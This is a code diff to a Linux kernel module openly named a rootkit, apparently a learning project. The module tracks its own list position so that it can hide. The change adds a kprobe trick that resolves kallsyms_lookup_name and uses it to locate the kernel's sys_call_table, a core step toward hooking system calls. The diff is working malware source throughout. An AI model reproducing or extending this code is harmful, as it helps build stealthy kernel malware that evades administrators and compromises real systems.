@@ -10,6 +10,7 @@
 #include <linux/cdev.h>
 #include <asm/syscall.h>
 #include <linux/string.h>
+#include <linux/kprobes.h>
 
 #include "rootkit.h"
 
@@ -27,6 +28,8 @@ struct device *device;
 dev_t dev;
 bool is_hidden;
 struct list_head *prev;
+unsigned long (*__kallsyms_lookup_name)(const char *);
+unsigned long **__sys_call_table;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -164,6 +167,21 @@ struct file_operations fops = {
 	owner: THIS_MODULE
 };
 
+static inline int get_kallsyms_lookup_name(void)
+{
+	struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name",
+	};
+
+	if (register_kprobe(&kp))
+		return -1;
+
+	__kallsyms_lookup_name = (unsigned long (*)(const char *))kp.addr;
+	unregister_kprobe(&kp);
+
+	return 0;
+}
+
 static int __init rootkit_init(void)
 {
 	int ret;
@@ -206,8 +224,25 @@ static int __init rootkit_init(void)
 	is_hidden = false;
 	prev = THIS_MODULE->list.prev;
 
+	// getting useful symbols
+	if (get_kallsyms_lookup_name() < 0) {
+		pr_err("get kallsyms_lookup_name failed\n");
+		ret = -EFAULT;
+		goto err_last;
+	}
+	__sys_call_table = (unsigned long **)(*__kallsyms_lookup_name)("sys_call_table");
+	if (__sys_call_table == 0) {
+		pr_err("get sys_call_table failed\n");
+		ret = -EFAULT;
+		goto err_last;
+	}
+	//pr_err("kallsyms_lookup_name: %#010lx\n", (unsigned long)__kallsyms_lookup_name);
+	//pr_err("sys_call_table: %#010lx\n", (unsigned long)__sys_call_table);
+
 	return 0;
 
+err_last:
+	device_destroy(class, dev);
 err_device:
 	class_destroy(class);
 err_class:
